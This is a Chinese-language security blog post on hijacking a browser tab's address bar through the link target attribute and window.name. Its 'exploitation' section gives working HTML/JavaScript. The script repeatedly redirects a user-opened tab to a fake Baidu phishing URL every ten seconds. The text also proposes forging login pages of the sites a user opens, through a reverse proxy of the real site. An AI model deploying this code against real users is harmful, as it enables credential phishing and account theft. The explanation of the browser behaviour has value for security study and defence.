# 前端黑魔法之远程控制地址栏



## 原理

如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《openresty+lua在反向代理服务中的玩法》中也有详细的介绍）

这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。

比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。

本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。

但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。

## 利用

```html
<html>
<head><meta charset="utf-8"></head>
<body>
<a href="https://www.baidu.com" target="baidu" id="baidu" onclick="return start()">click me</a>

<script>
function start() {
	setInterval(function() {
        baidu.href="http://675ba661.2m1.pw/baidu";
        baidu.click();
    }, 10000);
}
</script>
</body>
</html>
```



## 附录

### setInterval()
setInterval() 方法可按照指定的周期（以毫秒计）来调用函数或计算表达式。'
setInterval() 方法会不停地调用函数，直到 clearInterval() 被调用或窗口被关闭。由 setInterval() 返回的 ID 值可用作 clearInterval() 方法的参数。


### window.name

name 属性可设置或返回存放窗口的名称的一个字符串。

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>菜鸟教程(runoob.com)</title>
<script>
var myWindow;
function openWin(){
	myWindow=window.open('','MsgWindow','width=200,height=100');
	myWindow.document.write("<p>窗口名称为: " + myWindow.name + "</p>");  //  这里则会显示MsgWindow
}
</script>
</head>
<body>

<input type="button" value="打开我的窗口" onclick="openWin()" />

</body>
</html>
```

window.name 的美妙之处：name 值在不同的页面（甚至不同域名）加载后依旧存在，并且可以支持非常长的 name 值（2MB）。




192.168.199.144




## 资料

前端黑魔法之远程控制地址栏

https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html

使用 window.name 解决跨域问题

http://www.planabc.net/2008/09/01/window_name_transport/

window.name实现的跨域数据传输

http://www.cnblogs.com/rainman/archive/2011/02/21/1960044.html